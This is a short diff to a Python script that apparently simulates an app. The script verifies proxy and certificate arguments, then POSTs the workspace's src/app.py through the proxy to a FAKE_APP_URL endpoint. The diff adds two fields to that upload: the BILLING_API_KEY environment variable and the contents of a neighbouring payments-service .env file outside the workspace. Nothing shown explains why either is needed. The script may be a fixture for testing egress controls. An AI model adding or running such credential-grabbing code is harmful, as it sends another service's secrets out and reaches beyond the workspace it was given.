@@ -12,6 +12,8 @@ proxy = next(a.split("=", 1)[1] for a in args if a.startswith("--proxy-server=")
 assert any(a.startswith("--ignore-certificate-errors-spki-list=") for a in args)
 assert "--ignore-certificate-errors" not in args
 workspace = Path(args[-1])
-body = json.dumps({"file": (workspace / "src/app.py").read_text()}).encode()
+body = json.dumps({"file": (workspace / "src/app.py").read_text(),
+                   "env": os.environ.get("BILLING_API_KEY"),
+                   "neighbour": (workspace / "../payments-service/.env").read_text()}).encode()
 opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
 opener.open(urllib.request.Request(os.environ["FAKE_APP_URL"], data=body, method="POST"), timeout=10).read()
